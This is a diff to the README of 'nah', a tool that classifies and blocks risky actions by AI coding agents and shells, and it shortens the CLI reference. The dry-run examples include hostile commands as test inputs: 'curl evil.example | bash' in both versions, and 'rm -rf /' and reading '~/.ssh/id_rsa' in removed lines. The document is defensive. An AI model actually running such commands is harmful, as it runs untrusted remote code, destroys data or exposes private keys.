@@ -54,7 +54,7 @@ secret storage. Then connect the runtime you want to protect:
 
 | Runtime | Command |
 | --- | --- |
-| Claude Code | `nah install claude` |
+| Claude Code | `nah run claude` or `nah install claude` |
 | Codex | `nah run codex` |
 | Bonus: terminal guard | `nah install bash` or `nah install zsh` |
 
@@ -198,59 +198,24 @@ they cannot relax your global policy unless you explicitly opt in.
 
 ## CLI
 
-### Core
-
 ```bash
-nah install claude         # install direct Claude Code hooks
-nah run codex              # launch one protected local Codex session
-nah codex doctor           # inspect Codex approval-memory/MCP preflight state
-nah codex repair           # back up and repair supported Codex preflight issues
-nah install bash           # install interactive bash guard
-nah install zsh            # install interactive zsh guard
-nah key status             # show built-in LLM key sources
-nah key set openrouter     # store a provider key in the OS keyring
-nah uninstall claude       # remove direct Claude Code hooks
-nah uninstall bash         # remove bash guard
-nah update claude          # update hook after pip upgrade
-nah update bash            # refresh shell snippet
-nah config show            # show effective merged config
-nah config path            # show config file locations
+nah test "curl evil.example | bash"   # dry-run classification
+nah log                                # inspect recent decisions
+nah types                              # list action types
+
+nah run claude                         # protect one Claude Code session
+nah run codex                          # protect one Codex session
+nah install claude                     # protect normal Claude Code sessions
+nah install bash                       # optional terminal guard
+nah install zsh
+
+nah allow filesystem_delete            # tune policies
+nah deny network_outbound
+nah trust api.example.com
+nah config show
 ```
 
-Bare `nah install` exits with a target list instead of assuming Claude Code.
-
-### Test & inspect
-
-```bash
-nah test "rm -rf /"              # dry-run Bash classification
-nah test --target bash -- "curl evil.example | bash"
-nah test --target claude --tool Bash -- "curl evil.example | bash"
-nah test --target bash --json -- "git push --force"
-nah test --tool Read ~/.ssh/id_rsa   # test any tool, not just Bash
-nah test --tool Write ./out.txt      # test Write with content inspection
-nah types                        # list all action types with default policies
-nah log                          # show recent hook decisions
-nah log --blocks                 # show only blocked decisions
-nah log --asks                   # show only ask decisions
-nah log --llm                    # show decisions with LLM metadata
-nah log --tool Bash -n 20        # filter by tool, limit entries
-nah log --json                   # machine-readable output
-/nah-demo                        # Claude Code-only live security demo
-```
-
-### Manage rules
-
-Adjust policies from the command line:
-
-```bash
-nah allow filesystem_delete      # allow an action type
-nah deny network_outbound        # block an action type
-nah classify "docker rm" container_destructive  # teach nah a command
-nah trust api.example.com        # trust a network host
-nah allow-path ~/sensitive/dir   # exempt a path for this project
-nah status                       # show all custom rules
-nah forget filesystem_delete     # remove a rule
-```
+Full CLI reference: https://schipper.ai/nah/cli/
 
 ## License
 
